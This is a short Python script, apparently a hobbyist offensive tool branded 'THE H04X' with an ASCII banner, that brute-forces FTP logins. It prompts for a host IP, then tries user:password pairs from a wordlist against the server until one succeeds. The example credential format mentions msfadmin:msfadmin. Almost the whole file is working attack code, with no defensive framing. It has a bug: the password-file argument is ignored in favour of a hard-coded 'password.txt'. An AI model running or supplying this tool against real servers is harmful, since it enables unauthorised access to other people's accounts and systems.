

def brute_force(host,passwd_file):
    with open("password.txt") as file:
        for user_pass in file.readlines():
            user = user_pass.split(":")[0]
            passwd = user_pass.split(":")[1].strip("\n")
            print("TRYING >>>>>>  " + user_pass.strip("\n"))
            try:
                ftp = ftplib.FTP(host)
                login = ftp.login(user , passwd)
                print("login succeed  -->" + user_pass)
                exit(0)
            except:
                continue
try:
    import ftplib
    from termcolor import colored

    print(colored(r'''
        --------- |     | 0000000    /\    /\     0000   000000000000000000000000000000000000000000000000000000
            |     |_____| 0     0   /  \  /  \   0    0  0                       0000000     0000      00000000
            |     |     | 0     0  /    \/    \  000000  0000000                 0          0    0        0
            |     |     | 0000000 /            \ 0    0         0      \ THE /   0          000000        0
            |                    /              \               0        ___     0000000    0    0        0
            | 000000000000000000000000000000000000000000000000000                                         0
            |                                                                                             0
                                                            --- THE H04X
    ''', "red", attrs=["bold", "underline"])
          )
    
    host = input("enter ip address of the host :")
    print("\n\nENTER THE FILE WITH USER:PASSWORD FILE user and passwd are seperated by colon eg:msfadmin:msfadmin\n\n")
    passwd_file = input("enter the user passwd file : ")
    brute_force(host , passwd_file)
except Exception as e:
    print(e)
    
